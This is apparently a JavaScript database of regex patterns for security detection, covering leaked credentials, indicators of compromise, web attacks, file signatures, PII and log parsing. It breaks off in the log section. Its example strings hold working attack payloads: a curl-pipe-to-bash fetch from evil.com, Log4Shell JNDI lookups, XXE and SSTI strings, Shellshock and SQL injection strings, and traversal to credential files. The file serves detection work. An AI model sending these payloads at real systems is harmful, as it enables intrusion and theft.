// Security Regex Patterns Database — patterns for detecting threats, validating input, and extracting artifacts
// Organized by category with pattern, description, examples, and use cases

export const SECURITY_REGEX_DB = {

  // ═══════════════════════════════════════════════════════════════════════════
  // CREDENTIAL & SECRET DETECTION
  // ═══════════════════════════════════════════════════════════════════════════
  credentials: [
    {
      name: "AWS Access Key ID",
      pattern: "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
      description: "Detects AWS access key IDs. AKIA prefix indicates long-term credentials, ASIA indicates temporary STS credentials.",
      examples: ["AKIAIOSFODNN7EXAMPLE", "ASIAJEXAMPLEKEY12345"],
      falsePositives: "Random alphanumeric strings matching the pattern. Verify by checking for accompanying secret key.",
      severity: "Critical",
      category: "Cloud Credentials"
    },
    {
      name: "AWS Secret Access Key",
      pattern: "(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z/+]{40}['\"]",
      description: "Detects AWS secret access keys. 40-character Base64 string near the word 'aws'.",
      examples: ["(format: 40-char base64 string near aws keyword)"],
      falsePositives: "Other Base64 strings near 'aws'. Validate by attempting API call.",
      severity: "Critical",
      category: "Cloud Credentials"
    },
    {
      name: "Google API Key",
      pattern: "AIza[0-9A-Za-z\\-_]{35}",
      description: "Detects Google API keys. Always start with 'AIza' followed by 35 alphanumeric characters.",
      examples: ["AIzaXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"],
      falsePositives: "Very few — the AIza prefix is highly specific to Google.",
      severity: "High",
      category: "API Keys"
    },
    {
      name: "Google OAuth Client ID",
      pattern: "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
      description: "Detects Google OAuth client IDs. Not secrets themselves but indicate OAuth misconfiguration if exposed with client secret.",
      examples: ["123456789-abcdefghijklmnopqrstuvwxyz1234.apps.googleusercontent.com"],
      falsePositives: "Minimal — the .apps.googleusercontent.com suffix is unique.",
      severity: "Medium",
      category: "OAuth"
    },
    {
      name: "GitHub Personal Access Token",
      pattern: "ghp_[0-9a-zA-Z]{36}",
      description: "Detects GitHub personal access tokens (new format with ghp_ prefix).",
      examples: ["ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"],
      falsePositives: "Minimal — ghp_ prefix is specific to GitHub.",
      severity: "Critical",
      category: "API Keys"
    },
    {
      name: "GitHub OAuth Access Token",
      pattern: "gho_[0-9a-zA-Z]{36}",
      description: "Detects GitHub OAuth access tokens.",
      examples: ["gho_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"],
      falsePositives: "Minimal.",
      severity: "Critical",
      category: "OAuth"
    },
    {
      name: "GitHub App Token",
      pattern: "(ghu|ghs)_[0-9a-zA-Z]{36}",
      description: "Detects GitHub user-to-server (ghu_) and server-to-server (ghs_) tokens.",
      examples: ["ghs_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"],
      falsePositives: "Minimal.",
      severity: "Critical",
      category: "API Keys"
    },
    {
      name: "Slack Bot Token",
      pattern: "<SLACK_BOT_TOKEN>",
      description: "Detects Slack bot tokens. Provides access to Slack workspace with bot permissions.",
      examples: ["(format: xoxb-NUMS-NUMS-CHARS)"],
      falsePositives: "Minimal — xoxb- prefix is unique to Slack.",
      severity: "High",
      category: "API Keys"
    },
    {
      name: "Slack User Token",
      pattern: "<SLACK_USER_TOKEN>",
      description: "Detects Slack user tokens. Provides access with the user's full permissions.",
      examples: ["(format: xoxp-NUMS-NUMS-NUMS-HEX)"],
      falsePositives: "Minimal.",
      severity: "Critical",
      category: "API Keys"
    },
    {
      name: "Slack Webhook URL",
      pattern: "https://hooks\\.slack\\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[a-zA-Z0-9]{24}",
      description: "Detects Slack incoming webhook URLs. Can be used to post messages to channels.",
      examples: ["(format: hooks.slack.com/services/TXXXX/BXXXX/XXXX)"],
      falsePositives: "None — URL format is unique.",
      severity: "Medium",
      category: "Webhooks"
    },
    {
      name: "Stripe API Key (Secret)",
      pattern: "sk_(live|test)_[0-9a-zA-Z]{24,}",
      description: "Detects Stripe secret API keys. sk_live_ keys provide full access to production payment processing.",
      examples: ["(format: sk_live_XXXX or sk_test_XXXX)"],
      falsePositives: "Minimal — sk_live/sk_test prefix is Stripe-specific.",
      severity: "Critical",
      category: "Payment"
    },
    {
      name: "Stripe API Key (Publishable)",
      pattern: "pk_(live|test)_[0-9a-zA-Z]{24,}",
      description: "Detects Stripe publishable keys. These are designed to be public but indicate Stripe integration.",
      examples: ["(format: pk_live_XXXX)"],
      falsePositives: "Minimal.",
      severity: "Low",
      category: "Payment"
    },
    {
      name: "Twilio Account SID",
      pattern: "AC[a-f0-9]{32}",
      description: "Detects Twilio Account SIDs. Used with auth token for API access.",
      examples: ["(format: AC + 32 hex chars)"],
      falsePositives: "Random hex strings starting with AC.",
      severity: "Medium",
      category: "API Keys"
    },
    {
      name: "Twilio Auth Token",
      pattern: "(?i)twilio(.{0,20})?['\"][a-f0-9]{32}['\"]",
      description: "Detects Twilio authentication tokens near the word 'twilio'.",
      examples: ["(format: 32 hex chars near word twilio)"],
      falsePositives: "Other 32-char hex strings near 'twilio'.",
      severity: "High",
      category: "API Keys"
    },
    {
      name: "SendGrid API Key",
      pattern: "SG\\.[0-9A-Za-z\\-_]{22}\\.[0-9A-Za-z\\-_]{43}",
      description: "Detects SendGrid API keys. Used for email sending via SendGrid.",
      examples: ["(format: SG.XXXX.XXXX)"],
      falsePositives: "Minimal — SG. prefix is unique.",
      severity: "High",
      category: "API Keys"
    },
    {
      name: "Mailgun API Key",
      pattern: "key-[0-9a-zA-Z]{32}",
      description: "Detects Mailgun API keys.",
      examples: ["(format: key-XXXX 32 chars)"],
      falsePositives: "Possible if other services use key- prefix with 32-char values.",
      severity: "High",
      category: "API Keys"
    },
    {
      name: "Private Key (PEM)",
      pattern: "-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
      description: "Detects PEM-encoded private keys. These should never be committed to repositories or exposed.",
      examples: ["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----", "-----BEGIN EC PRIVATE KEY-----"],
      falsePositives: "Test/example keys. Verify if the key is valid and in use.",
      severity: "Critical",
      category: "Cryptographic Keys"
    },
    {
      name: "Generic Password in Code",
      pattern: "(?i)(password|passwd|pwd|secret|token|api_key|apikey|access_key|auth)\\s*[=:]\\s*['\"][^'\"]{8,}['\"]",
      description: "Detects hardcoded passwords and secrets in source code. Matches common variable names followed by string values.",
      examples: ["(format: password/secret/token = value)"],
      falsePositives: "Placeholder/example values, environment variable references, documentation.",
      severity: "High",
      category: "Hardcoded Secrets"
    },
    {
      name: "JWT Token",
      pattern: "eyJ[A-Za-z0-9_-]*\\.eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*",
      description: "Detects JSON Web Tokens. Three Base64url-encoded parts separated by dots.",
      examples: ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.Sfl..."],
      falsePositives: "Base64 data that happens to match the pattern.",
      severity: "High",
      category: "Authentication"
    },
    {
      name: "Basic Auth Header",
      pattern: "(?i)authorization:\\s*basic\\s+[A-Za-z0-9+/=]{10,}",
      description: "Detects HTTP Basic Authentication headers containing Base64-encoded credentials.",
      examples: ["Authorization: Basic dXNlcjpwYXNzd29yZA=="],
      falsePositives: "Minimal.",
      severity: "High",
      category: "Authentication"
    },
    {
      name: "Bearer Token Header",
      pattern: "(?i)authorization:\\s*bearer\\s+[A-Za-z0-9._~+/=-]{20,}",
      description: "Detects HTTP Bearer authentication tokens.",
      examples: ["Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."],
      falsePositives: "Minimal in logs; common in documentation.",
      severity: "High",
      category: "Authentication"
    },
    {
      name: "Azure Storage Account Key",
      pattern: "(?i)(DefaultEndpointsProtocol|AccountKey)=[^;\\s]{20,}",
      description: "Detects Azure Storage account connection strings containing account keys.",
      examples: ["DefaultEndpointsProtocol=https;AccountName=myaccount;AccountKey=base64key==;EndpointSuffix=core.windows.net"],
      falsePositives: "Connection string templates in documentation.",
      severity: "Critical",
      category: "Cloud Credentials"
    },
    {
      name: "Heroku API Key",
      pattern: "(?i)heroku(.{0,20})?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
      description: "Detects Heroku API keys (UUID format near the word 'heroku').",
      examples: ["(format: HEROKU_API_KEY=UUID)"],
      falsePositives: "Other UUIDs near 'heroku'.",
      severity: "High",
      category: "API Keys"
    },
    {
      name: "Docker Registry Auth",
      pattern: "(?i)(docker|registry)(.{0,20})?(password|token|auth)(.{0,20})?['\"][^'\"]{8,}['\"]",
      description: "Detects Docker registry authentication credentials in configuration files.",
      examples: ["(format: docker_password = value)"],
      falsePositives: "Example configurations.",
      severity: "High",
      category: "Container"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // NETWORK & IOC PATTERNS
  // ═══════════════════════════════════════════════════════════════════════════
  network: [
    {
      name: "IPv4 Address",
      pattern: "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b",
      description: "Matches valid IPv4 addresses (0.0.0.0 to 255.255.255.255). Validates each octet range.",
      examples: ["192.168.1.1", "10.0.0.1", "255.255.255.255"],
      falsePositives: "Version numbers (e.g., 2.4.41), numeric identifiers.",
      severity: "Info",
      category: "Network"
    },
    {
      name: "IPv4 with CIDR Notation",
      pattern: "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/(?:3[0-2]|[12]?[0-9])\\b",
      description: "Matches IPv4 addresses with CIDR subnet notation (e.g., /24, /32).",
      examples: ["192.168.1.0/24", "10.0.0.0/8", "172.16.0.0/12"],
      falsePositives: "Minimal.",
      severity: "Info",
      category: "Network"
    },
    {
      name: "IPv6 Address (Full)",
      pattern: "(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}",
      description: "Matches full IPv6 addresses (8 groups of 4 hex digits separated by colons).",
      examples: ["2001:0db8:85a3:0000:0000:8a2e:0370:7334"],
      falsePositives: "Possible with other hex-colon formats.",
      severity: "Info",
      category: "Network"
    },
    {
      name: "Private IPv4 Ranges",
      pattern: "\\b(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|172\\.(1[6-9]|2[0-9]|3[01])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})\\b",
      description: "Matches RFC 1918 private IPv4 addresses. Useful for identifying internal network references in logs.",
      examples: ["10.0.0.1", "172.16.0.1", "192.168.1.1"],
      falsePositives: "Minimal — these ranges are always private.",
      severity: "Info",
      category: "Network"
    },
    {
      name: "MAC Address",
      pattern: "([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})",
      description: "Matches MAC addresses in colon or hyphen-separated format.",
      examples: ["00:1A:2B:3C:4D:5E", "00-1A-2B-3C-4D-5E"],
      falsePositives: "Minimal.",
      severity: "Info",
      category: "Network"
    },
    {
      name: "URL",
      pattern: "https?://[\\w.-]+(?:\\.[a-zA-Z]{2,})(?:[/\\w.?&=%-]*)?",
      description: "Matches HTTP and HTTPS URLs. Useful for extracting URLs from logs, emails, and documents.",
      examples: ["https://www.example.com/path?param=value", "http://evil-c2.com/beacon"],
      falsePositives: "Legitimate URLs. Context determines if an IOC.",
      severity: "Info",
      category: "IOC"
    },
    {
      name: "Domain Name",
      pattern: "\\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}\\b",
      description: "Matches domain names. Useful for IOC extraction from threat reports and log analysis.",
      examples: ["evil-c2.example.com", "phishing-site.tk", "legitimate.domain.org"],
      falsePositives: "File extensions (.exe.com), version strings. Refine with TLD validation.",
      severity: "Info",
      category: "IOC"
    },
    {
      name: "Email Address",
      pattern: "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}",
      description: "Matches email addresses. Useful for OSINT, phishing analysis, and data leak detection.",
      examples: ["admin@example.com", "user.name+tag@domain.co.uk"],
      falsePositives: "Non-standard email formats may be missed.",
      severity: "Info",
      category: "PII"
    },
    {
      name: "Bitcoin Address (P2PKH)",
      pattern: "\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b",
      description: "Matches Bitcoin P2PKH addresses (starting with 1 or 3). Used in ransomware and cryptocurrency fraud investigations.",
      examples: ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"],
      falsePositives: "Random alphanumeric strings. Validate checksum for confirmation.",
      severity: "Medium",
      category: "Cryptocurrency"
    },
    {
      name: "Bitcoin Address (Bech32)",
      pattern: "\\bbc1[a-zA-HJ-NP-Z0-9]{25,90}\\b",
      description: "Matches Bitcoin Bech32 (SegWit) addresses starting with bc1.",
      examples: ["bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"],
      falsePositives: "Minimal — bc1 prefix is specific.",
      severity: "Medium",
      category: "Cryptocurrency"
    },
    {
      name: "Ethereum Address",
      pattern: "\\b0x[0-9a-fA-F]{40}\\b",
      description: "Matches Ethereum addresses (42-character hex string starting with 0x).",
      examples: ["0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28"],
      falsePositives: "Other hex values with 0x prefix.",
      severity: "Medium",
      category: "Cryptocurrency"
    },
    {
      name: "Monero Address",
      pattern: "\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b",
      description: "Matches Monero (XMR) addresses. Common in cryptomining malware.",
      examples: ["44AFFq5kSiGBoZ4NMDwYtN18NkMRoqH1uf4LswBTwjFf..."],
      falsePositives: "Very few — 95-character Base58 is distinctive.",
      severity: "Medium",
      category: "Cryptocurrency"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // ATTACK DETECTION PATTERNS
  // ═══════════════════════════════════════════════════════════════════════════
  attacks: [
    {
      name: "SQL Injection (Union-Based)",
      pattern: "(?i)(union\\s+(all\\s+)?select|select\\s+.*\\s+from\\s+information_schema)",
      description: "Detects UNION-based SQL injection attempts in HTTP parameters, logs, and WAF events.",
      examples: ["' UNION ALL SELECT 1,2,3--", "UNION SELECT username,password FROM users--"],
      falsePositives: "Legitimate SQL queries in application logs.",
      severity: "Critical",
      category: "SQL Injection"
    },
    {
      name: "SQL Injection (Common Patterns)",
      pattern: "(?i)('\\s*(or|and)\\s+['\"]?\\d+['\"]?\\s*=\\s*['\"]?\\d+|'\\s*;\\s*(drop|alter|delete|update|insert)\\s)",
      description: "Detects common SQL injection patterns including tautologies and destructive statements.",
      examples: ["' OR '1'='1", "'; DROP TABLE users--", "' AND 1=1--"],
      falsePositives: "Minimal in web request context.",
      severity: "Critical",
      category: "SQL Injection"
    },
    {
      name: "SQL Injection (Time-Based Blind)",
      pattern: "(?i)(sleep\\s*\\(|benchmark\\s*\\(|waitfor\\s+delay|pg_sleep)",
      description: "Detects time-based blind SQL injection using database-specific delay functions.",
      examples: ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"],
      falsePositives: "Legitimate use of sleep functions in application queries.",
      severity: "Critical",
      category: "SQL Injection"
    },
    {
      name: "XSS (Script Tags)",
      pattern: "(?i)<script[^>]*>[\\s\\S]*?</script>|<script[^>]*>",
      description: "Detects script tag injection attempts for cross-site scripting.",
      examples: ["<script>alert('XSS')</script>", "<script src='http://evil.com/xss.js'>"],
      falsePositives: "Legitimate script tags in HTML content.",
      severity: "High",
      category: "XSS"
    },
    {
      name: "XSS (Event Handlers)",
      pattern: "(?i)\\bon(error|load|click|mouseover|focus|blur|submit|change|input|keyup|keydown|mouseenter)\\s*=",
      description: "Detects inline JavaScript event handler injection for XSS.",
      examples: ["<img onerror=alert(1)>", "<body onload=alert('XSS')>", "<input onfocus=alert(1) autofocus>"],
      falsePositives: "Legitimate event handlers in HTML.",
      severity: "High",
      category: "XSS"
    },
    {
      name: "XSS (JavaScript Protocol)",
      pattern: "(?i)javascript\\s*:",
      description: "Detects javascript: protocol URI injection for XSS.",
      examples: ["javascript:alert(1)", "<a href='javascript:document.cookie'>"],
      falsePositives: "Minimal in user input context.",
      severity: "High",
      category: "XSS"
    },
    {
      name: "Command Injection",
      pattern: "(?i)(;|\\||&&|\\$\\(|`)[\\s]*?(cat|ls|id|whoami|uname|curl|wget|nc|ncat|bash|sh|python|perl|ruby|php)",
      description: "Detects OS command injection attempts using shell metacharacters followed by common commands.",
      examples: ["; cat /etc/passwd", "| whoami", "&& curl http://evil.com/shell.sh | bash"],
      falsePositives: "Legitimate shell commands in logs.",
      severity: "Critical",
      category: "Command Injection"
    },
    {
      name: "Path Traversal",
      pattern: "(?:(?:\\.\\./)|(?:\\.\\.\\\\)){2,}|(?:(?:/|\\\\)(?:etc|windows|boot)(?:/|\\\\))",
      description: "Detects directory traversal attempts using ../ or ..\\ sequences and common sensitive paths.",
      examples: ["../../etc/passwd", "..\\..\\windows\\system32\\config\\sam", "/etc/shadow"],
      falsePositives: "Legitimate relative paths in application code.",
      severity: "High",
      category: "Path Traversal"
    },
    {
      name: "SSRF (Cloud Metadata)",
      pattern: "(?i)(169\\.254\\.169\\.254|metadata\\.google\\.internal|100\\.100\\.100\\.200)",
      description: "Detects SSRF attempts targeting cloud provider metadata services (AWS, GCP, Azure).",
      examples: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://metadata.google.internal/computeMetadata/v1/"],
      falsePositives: "Legitimate metadata queries from within cloud instances.",
      severity: "Critical",
      category: "SSRF"
    },
    {
      name: "XXE (External Entity)",
      pattern: "(?i)<!\\s*entity\\s+[^>]*system\\s+['\"]",
      description: "Detects XML External Entity injection attempts in XML input.",
      examples: ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>"],
      falsePositives: "Legitimate XML DTD declarations.",
      severity: "Critical",
      category: "XXE"
    },
    {
      name: "LDAP Injection",
      pattern: "(?i)[)(|*\\\\]\\s*(?:objectclass|cn|uid|sn|mail|userpassword)\\s*[=~<>]",
      description: "Detects LDAP injection attempts in search filters.",
      examples: [")(cn=*)", "*(|(uid=admin)(userPassword=*))"],
      falsePositives: "Legitimate LDAP queries.",
      severity: "High",
      category: "Injection"
    },
    {
      name: "Log4Shell (CVE-2021-44228)",
      pattern: "(?i)\\$\\{(?:j|\\$\\{[^}]*\\})ndi:(?:ldap|rmi|dns|iiop|corba|nds|http)s?://",
      description: "Detects Log4Shell exploitation attempts using JNDI lookup injection in Java applications.",
      examples: ["${jndi:ldap://evil.com/exploit}", "${${lower:j}ndi:rmi://attacker.com/obj}", "${jndi:dns://evil.com}"],
      falsePositives: "Legitimate JNDI lookups (rare in user input).",
      severity: "Critical",
      category: "RCE"
    },
    {
      name: "Server-Side Template Injection (Jinja2)",
      pattern: "\\{\\{\\s*[^}]*\\s*(config|request|self|lipsum|cycler|joiner|namespace|range|dict)\\s*[^}]*\\}\\}",
      description: "Detects Jinja2 template injection attempts targeting Python web frameworks (Flask, Django).",
      examples: ["{{config.items()}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],
      falsePositives: "Legitimate Jinja2 template syntax in template files.",
      severity: "Critical",
      category: "SSTI"
    },
    {
      name: "Shellshock (CVE-2014-6271)",
      pattern: "\\(\\)\\s*\\{\\s*[^;]*;\\s*\\}\\s*;",
      description: "Detects Bash Shellshock exploitation attempts in HTTP headers and CGI parameters.",
      examples: ["() { :; }; /bin/cat /etc/passwd", "() { ignored; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd"],
      falsePositives: "Minimal — the () { pattern in HTTP headers is always suspicious.",
      severity: "Critical",
      category: "RCE"
    },
    {
      name: "PHP Deserialization",
      pattern: "(?i)O:\\d+:\"[^\"]+\":\\d+:\\{",
      description: "Detects PHP serialized object injection in input parameters.",
      examples: ["O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}"],
      falsePositives: "Legitimate PHP serialized data.",
      severity: "High",
      category: "Deserialization"
    },
    {
      name: "Java Deserialization (ysoserial)",
      pattern: "(?i)rO0AB|aced0005",
      description: "Detects Java serialized objects (Base64-encoded 'rO0AB' or hex 'aced0005' magic bytes).",
      examples: ["rO0ABXNyABFq...", "aced00057372..."],
      falsePositives: "Legitimate Java serialized objects.",
      severity: "High",
      category: "Deserialization"
    },
    {
      name: "Prototype Pollution",
      pattern: "(?i)(__proto__|constructor\\s*\\[\\s*['\"]prototype['\"]\\s*\\]|Object\\.assign\\s*\\(\\s*\\{\\})",
      description: "Detects JavaScript prototype pollution attempts targeting __proto__ or constructor.prototype.",
      examples: ["__proto__[isAdmin]=true", "constructor[prototype][isAdmin]=1"],
      falsePositives: "Legitimate prototype access in JavaScript libraries.",
      severity: "High",
      category: "Prototype Pollution"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // FILE SIGNATURES (MAGIC BYTES)
  // ═══════════════════════════════════════════════════════════════════════════
  file_signatures: [
    {
      name: "Windows Executable (PE)",
      pattern: "^4d5a",
      description: "MZ header — DOS executable / Windows PE file (.exe, .dll, .sys, .scr, .ocx).",
      examples: ["4d5a9000 — Standard PE header"],
      falsePositives: "None for hex analysis.",
      severity: "Medium",
      category: "Executable"
    },
    {
      name: "ELF Binary",
      pattern: "^7f454c46",
      description: "ELF (Executable and Linkable Format) header — Linux/Unix executables and shared objects.",
      examples: ["7f454c46 — .ELF magic number"],
      falsePositives: "None.",
      severity: "Medium",
      category: "Executable"
    },
    {
      name: "PDF Document",
      pattern: "^25504446",
      description: "%PDF — PDF document header. May contain embedded JavaScript, macros, or exploits.",
      examples: ["25504446 — %PDF"],
      falsePositives: "None.",
      severity: "Low",
      category: "Document"
    },
    {
      name: "ZIP Archive",
      pattern: "^504b0304",
      description: "PK.. — ZIP archive header. Also used by DOCX, XLSX, PPTX, JAR, APK, and other container formats.",
      examples: ["504b0304 — PK standard ZIP"],
      falsePositives: "None. Content type depends on internal structure.",
      severity: "Low",
      category: "Archive"
    },
    {
      name: "RAR Archive",
      pattern: "^526172211a07",
      description: "Rar!.. — RAR archive header.",
      examples: ["526172211a0700 — RAR 5.0+"],
      falsePositives: "None.",
      severity: "Low",
      category: "Archive"
    },
    {
      name: "7-Zip Archive",
      pattern: "^377abcaf271c",
      description: "7z.. — 7-Zip archive header.",
      examples: ["377abcaf271c — 7z archive"],
      falsePositives: "None.",
      severity: "Low",
      category: "Archive"
    },
    {
      name: "GZip Compressed",
      pattern: "^1f8b08",
      description: "GZip compression header. Common for compressed log files and tarballs.",
      examples: ["1f8b08 — gzip"],
      falsePositives: "None.",
      severity: "Low",
      category: "Archive"
    },
    {
      name: "Microsoft Office (OLE)",
      pattern: "^d0cf11e0a1b11ae1",
      description: "OLE2 compound file — used by older Microsoft Office formats (.doc, .xls, .ppt) and other OLE containers.",
      examples: ["d0cf11e0a1b11ae1 — OLE2"],
      falsePositives: "None. May contain macros — inspect for malicious VBA.",
      severity: "Medium",
      category: "Document"
    },
    {
      name: "Mach-O Binary (macOS)",
      pattern: "^(feedface|feedfacf|cefaedfe|cffaedfe)",
      description: "Mach-O executable header — macOS/iOS executables and libraries.",
      examples: ["feedfacf — 64-bit Mach-O", "cffaedfe — Universal binary"],
      falsePositives: "None.",
      severity: "Medium",
      category: "Executable"
    },
    {
      name: "Java Class File",
      pattern: "^cafebabe",
      description: "Java class file header. May indicate Java exploitation payload.",
      examples: ["cafebabe — Java class"],
      falsePositives: "None.",
      severity: "Medium",
      category: "Executable"
    },
    {
      name: "SQLite Database",
      pattern: "^53514c69746520666f726d617420",
      description: "SQLite format 3 — SQLite database file. Contains browser history, cookies, and other application data.",
      examples: ["53514c697465 — 'SQLite format 3'"],
      falsePositives: "None.",
      severity: "Low",
      category: "Database"
    },
    {
      name: "Windows Shortcut (LNK)",
      pattern: "^4c000000011402",
      description: "Windows LNK shortcut file. Commonly used in phishing to execute commands via malicious shortcuts.",
      examples: ["4c000000 — Windows shell link"],
      falsePositives: "Legitimate shortcuts.",
      severity: "Medium",
      category: "Windows"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // PII & DATA VALIDATION
  // ═══════════════════════════════════════════════════════════════════════════
  pii: [
    {
      name: "US Social Security Number",
      pattern: "\\b(?!000|666|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0000)\\d{4}\\b",
      description: "Matches US Social Security Numbers in XXX-XX-XXXX format. Excludes known invalid ranges.",
      examples: ["123-45-6789", "234-56-7890"],
      falsePositives: "Random numbers matching the format.",
      severity: "Critical",
      category: "PII"
    },
    {
      name: "Credit Card (Visa)",
      pattern: "\\b4[0-9]{12}(?:[0-9]{3})?\\b",
      description: "Matches Visa card numbers (starts with 4, 13 or 16 digits).",
      examples: ["4111111111111111", "4012888888881881"],
      falsePositives: "Random 16-digit numbers starting with 4. Validate with Luhn algorithm.",
      severity: "Critical",
      category: "PCI"
    },
    {
      name: "Credit Card (Mastercard)",
      pattern: "\\b(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}\\b",
      description: "Matches Mastercard numbers (starts with 51-55 or 2221-2720, 16 digits).",
      examples: ["5500000000000004", "2221000000000009"],
      falsePositives: "Random numbers. Validate with Luhn algorithm.",
      severity: "Critical",
      category: "PCI"
    },
    {
      name: "Credit Card (Amex)",
      pattern: "\\b3[47][0-9]{13}\\b",
      description: "Matches American Express card numbers (starts with 34 or 37, 15 digits).",
      examples: ["378282246310005", "371449635398431"],
      falsePositives: "Random 15-digit numbers starting with 34/37.",
      severity: "Critical",
      category: "PCI"
    },
    {
      name: "US Phone Number",
      pattern: "\\b(?:\\+1[-.]?)?\\(?[2-9][0-9]{2}\\)?[-. ]?[2-9][0-9]{2}[-. ]?[0-9]{4}\\b",
      description: "Matches US phone numbers in various formats. Excludes invalid area codes starting with 0 or 1.",
      examples: ["+1 (555) 123-4567", "555-123-4567", "5551234567"],
      falsePositives: "Random 10-digit numbers.",
      severity: "Medium",
      category: "PII"
    },
    {
      name: "UK National Insurance Number",
      pattern: "\\b[A-CEGHJ-PR-TW-Z][A-CEGHJ-NPR-TW-Z]\\s?\\d{2}\\s?\\d{2}\\s?\\d{2}\\s?[A-D]\\b",
      description: "Matches UK National Insurance Numbers (NI numbers).",
      examples: ["QQ 12 34 56 A", "AB123456C"],
      falsePositives: "Similar alphanumeric patterns.",
      severity: "High",
      category: "PII"
    },
    {
      name: "IBAN (International Bank Account Number)",
      pattern: "\\b[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}\\b",
      description: "Matches International Bank Account Numbers. Country code + check digits + account number.",
      examples: ["GB29NWBK60161331926819", "DE89370400440532013000"],
      falsePositives: "Random alphanumeric strings matching the pattern.",
      severity: "High",
      category: "Financial"
    },
    {
      name: "Passport Number (US)",
      pattern: "\\b[A-Z]\\d{8}\\b",
      description: "Matches US passport numbers (one letter followed by 8 digits).",
      examples: ["A12345678"],
      falsePositives: "Other document numbers matching the format.",
      severity: "High",
      category: "PII"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // LOG ANALYSIS PATTERNS
  // ═══════════════════════════════════════════════════════════════════════════
  logs: [
    {
      name: "Apache/Nginx Access Log Entry",
      pattern: "^(\\S+) (\\S+) (\\S+) \\[([^]]+)\\] \"(\\S+) (\\S+) (\\S+)\" (\\d{3}) (\\d+|-) \"([^\"]*)\" \"([^\"]*)\"",
      description: "Parses Combined Log Format entries. Captures: IP, identity, user, timestamp, method, URI, protocol, status, bytes, referer, user-agent.",
      examples: ["10.10.14.2 - - [11/Sep/2024:10:30:00 +0000] \"GET /admin HTTP/1.1\" 403 1234 \"-\" \"Mozilla/5.0\""],
      falsePositives: "None — standard log format.",
      severity: "Info",
      category: "Web Logs"
    },
    {
      name: "Failed SSH Login",
      pattern: "(?i)failed\\s+password\\s+for\\s+(invalid\\s+user\\s+)?(.+?)\\s+from\\s+(\\S+)\\s+port\\s+(\\d+)",
      description: "Matches failed SSH login attempts in auth.log/secure. Captures username, source IP, and port.",
      examples: ["Failed password for invalid user admin from 10.10.14.2 port 54321 ssh2"],
      falsePositives: "None in SSH auth logs.",
      severity: "Medium",
      category: "Auth Logs"
    },
    {
      name: "Successful SSH Login",
      pattern: "(?i)accepted\\s+(password|publickey)\\s+for\\s+(.+?)\\s+from\\s+(\\S+)\\s+port\\s+(\\d+)",
      description: "Matches successful SSH logins. Captures auth method, username, source IP, and port.",
      examples: ["Accepted publickey for admin from 10.10.14.2 port 54321 ssh2"],
      falsePositives: "None — legitimate login events.",
      severity: "Info",
      category: "Auth Logs"
    },
    {
      name: "Sudo Command Execution",
      pattern: "(?i)(\\S+)\\s+:\\s+TTY=(\\S+)\\s+;\\s+PWD=(\\S+)\\s+;\\s+USER=(\\S+)\\s+;\\s+COMMAND=(.*)",
      description: "Matches sudo command execution in auth.log. Captures user, TTY, directory, target user, and command.",
      examples: ["admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash"],
      falsePositives: "None — standard sudo logging.",
      severity: "Medium",
      category: "Auth Logs"
    },
    {
      name: "Windows Security Event (XML)",
